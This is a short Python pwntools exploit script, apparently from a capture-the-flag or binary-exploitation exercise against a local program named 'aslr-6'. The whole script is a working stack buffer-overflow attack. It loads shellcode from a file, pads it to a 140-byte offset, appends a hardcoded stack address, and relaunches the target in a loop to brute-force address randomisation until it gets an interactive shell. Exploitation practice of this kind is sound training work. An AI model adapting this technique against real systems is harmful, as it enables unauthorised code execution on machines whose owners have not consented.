#!/usr/bin/env python

from pwn import *

offset = 140
shellcode = ''

with open('shellcode.bin', 'r') as f:
    shellcode = f.readline()

inp = shellcode
inp += 'A' * (offset - len(shellcode))

buffer = 0xffbd0f70

while True:
    p = process('./aslr-6')
    p.send(inp + p32(buffer))
    p.clean()
    p.interactive()
    p.close()
